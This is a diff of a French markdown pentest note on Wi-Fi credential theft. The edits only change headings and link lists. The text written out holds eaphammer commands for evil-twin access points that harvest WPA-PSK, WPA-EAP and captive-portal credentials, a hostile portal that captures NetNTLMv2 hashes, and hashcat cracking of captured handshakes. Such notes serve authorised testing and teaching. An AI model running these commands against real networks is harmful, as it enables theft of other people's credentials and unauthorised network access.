@@ -29,7 +29,7 @@ Une fois connecté avec le client tester en se rendant sur ce site : http://zero
 
 # Stealing credentials
 
-**PSK**
+## PSK
 ```bash
 sudo ./eaphammer -i wlan0 -e testpsk --auth wpa-psk
 ```
@@ -40,13 +40,13 @@ hcxpcapngtool capture.pcap -o capture.hc22000
 hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt
 ```
 
-**EAP**
+## EAP
 ```bash
 sudo ./eaphammer --cert-wizard  
 sudo ./eaphammer -i wlan0 -e testeap --auth wpa-eap --creds
 ```
 
-**Captive portal**
+## Captive portal
 ```bash
 sudo ./eaphammer -i wlan0 -e captive-portal --auth open --captive-portal
 
@@ -55,12 +55,12 @@ sudo ./eaphammer --list-templates
 sudo ./eaphammer --delete-template --name nom_template
 ```
 
-**Hostile portal (Responder - NetNTLMv2)**
+## Hostile portal (Responder - NetNTLMv2)
 ```bash
 sudo ./eaphammer -i wlan0 -e hostile-portal --auth open --hostile-portal
 ```
 
-**Reproduire le réseau Wi-Fi**
+## Reproduire le réseau Wi-Fi
 
 ```bash
 sudo iwlist wlan0 scan 
@@ -73,12 +73,8 @@ sudo iwlist wlan0 scan
 | BSSID         | `-b`, `--bssid`     | Adresse MAC de l'AP        |
 | Canal         | `-c`, `--channel`   | Canal Wi-Fi                |
 | Mode matériel | `--hw-mode`         | `g` (2.4GHz) ou `a` (5GHz) |
-## PMKID Attacks
-https://github.com/s0lst1c3/eaphammer/wiki/XII.-PMKID-Attacks-Against-WPA-PSK-and-WPA2-PSK-Networks
 
-## PSK attacks
-https://github.com/v1s1t0r1sh3r3/airgeddon
-https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets
+# Attacks
 
 ## Settings
 
@@ -86,8 +82,9 @@ https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets
 iw dev wlan0 info        # puissance actuelle (txpower)
 iw phy phy2 info         # puissance max (sous "max TX power")
 ```
-# PMKID Attacks
-https://github.com/s0lst1c3/eaphammer/wiki/XII.-PMKID-Attacks-Against-WPA-PSK-and-WPA2-PSK-Networks
+## PMKID Attacks
+- https://github.com/s0lst1c3/eaphammer/wiki/XII.-PMKID-Attacks-Against-WPA-PSK-and-WPA2-PSK-Networks
 
-# PSK attacks
-https://github.com/v1s1t0r1sh3r3/airgeddon
+## PSK attacks
+- https://github.com/v1s1t0r1sh3r3/airgeddon
+- https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Cards%20and%20Chipsets
